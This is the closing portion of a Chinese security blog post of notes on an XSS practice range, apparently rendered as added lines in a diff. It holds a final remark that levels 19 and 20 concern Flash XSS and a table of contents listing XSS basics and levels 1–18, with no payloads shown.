+<p><img src="\img\images\xss\1566111956810.png" alt="1566111956810"></p>
+<p>19、20均为 flash xss内容</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/xss/">xss</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2019/09/17/xss靶场刷题笔记/" data-title="xss靶场刷题笔记 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2019/09/16/upload-labs通关笔记/"  title="upload-labs通关笔记">
+ <strong>下一篇：</strong><br/> 
+ <span>upload-labs通关笔记
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分类"><span class="toc-number">1.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#危害"><span class="toc-number">1.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于JavaScript"><span class="toc-number">1.3.</span> <span class="toc-text">关于JavaScript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html与js基础"><span class="toc-number">1.4.</span> <span class="toc-text">html与js基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#触发场景"><span class="toc-number">1.5.</span> <span class="toc-text">触发场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见绕过"><span class="toc-number">1.6.</span> <span class="toc-text">常见绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶场"><span class="toc-number">2.</span> <span class="toc-text">靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#level1"><span class="toc-number">2.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level2"><span class="toc-number">2.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level3"><span class="toc-number">2.3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level4"><span class="toc-number">2.4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leve5"><span class="toc-number">2.5.</span> <span class="toc-text">leve5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level6"><span class="toc-number">2.6.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level7"><span class="toc-number">2.7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level8"><span class="toc-number">2.8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level9"><span class="toc-number">2.9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level10"><span class="toc-number">2.10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level11"><span class="toc-number">2.11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level12"><span class="toc-number">2.12.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level13"><span class="toc-number">2.13.</span> <span class="toc-text">level13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level14"><span class="toc-number">2.14.</span> <span class="toc-text">level14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level15"><span class="toc-number">2.15.</span> <span class="toc-text">level15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level16"><span class="toc-number">2.16.</span> <span class="toc-text">level16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level17"><span class="toc-number">2.17.</span> <span class="toc-text">level17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level18"><span class="toc-number">2.18.</span> <span class="toc-text">level18</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>16</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>16</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redis/" title="redis">redis<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/dockerfile/" title="dockerfile">dockerfile<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Jenkins/" title="Jenkins">Jenkins<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/jekyll/" title="jekyll">jekyll<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nodejs/" title="nodejs">nodejs<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://p0desta.com" target="_blank" title="p0desta">p0desta</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.test407.cn" target="_blank" title="薯片博客">薯片博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://alem0n.github.io" target="_blank" title="lem0n">lem0n</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
